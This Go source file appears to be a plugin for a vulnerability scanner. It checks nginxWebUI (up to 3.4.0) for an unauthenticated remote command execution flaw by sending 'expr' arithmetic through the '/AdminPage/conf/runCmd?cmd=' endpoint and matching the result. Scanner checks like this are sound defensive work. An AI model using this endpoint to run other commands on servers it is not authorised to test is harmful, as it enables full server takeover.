// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("nginxWebUI_runCmd_rce", &nginxWebUI_runCmd_rce{})
}

type nginxWebUI_runCmd_rce struct{}

func (p *nginxWebUI_runCmd_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "nginxWebUI runCmd 远程命令执行漏洞",
		VulnInfo: "nginxWebUI 是一款 Nginx可视化配置管理工具。2023年国内安全社区披露其存在权限绕过与后台命令执行漏洞，攻击者可在无需登录的情况下绕过路由权限校验，执行任意命令，控制服务器。",
		VulnID:   "",
		Level:    "HIGH",
		URL:      "",
		Version:  "nginxWebUI <= 3.4.0",
		CWE:      "",
	}
}

func (p *nginxWebUI_runCmd_rce) Check(netloc string) bool {
	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)
	payload := fmt.Sprintf("/AdminPage/conf/runCmd?cmd=expr%%20%d%%20-%%20%d", rand1, rand2)
	checkReq, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	checkResp, err := utils.RequestDo(checkReq, true, 2)
	if err != nil {
		return false
	}

	if checkResp.Other.StatusCode == 200 && strings.Contains(checkResp.ResponseRaw, strconv.Itoa(rand1-rand2)) {
		return true
	}

	return false
}
